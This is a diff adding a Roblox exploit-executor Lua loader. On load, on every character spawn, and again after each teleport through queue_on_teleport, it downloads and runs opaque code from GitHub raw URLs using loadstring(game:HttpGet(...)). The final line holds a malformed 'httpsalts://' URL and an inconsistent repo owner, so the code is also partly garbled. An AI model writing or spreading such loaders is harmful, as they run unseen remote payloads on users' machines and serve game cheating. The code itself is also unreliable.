@@ -1,0 +1,24 @@
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback
+end
+
+queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
+
+
+
+local TeleportCheck = false
+game.Players.LocalPlayer.OnTeleport:Connect(function(State)
+	if (not TeleportCheck) and queueteleport then
+		TeleportCheck = true
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/juliosalt/unknownss/refs/heads/main/loloilololol'))()")
+	end
+end)
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/juliosalt/unknownss/refs/heads/main/kytezl'))()
+end)
+
+loadstring(game:HttpGet('httpsalts://raw.githubusercontent.com/julio/unknownss/refs/heads/main/kytezl'))()
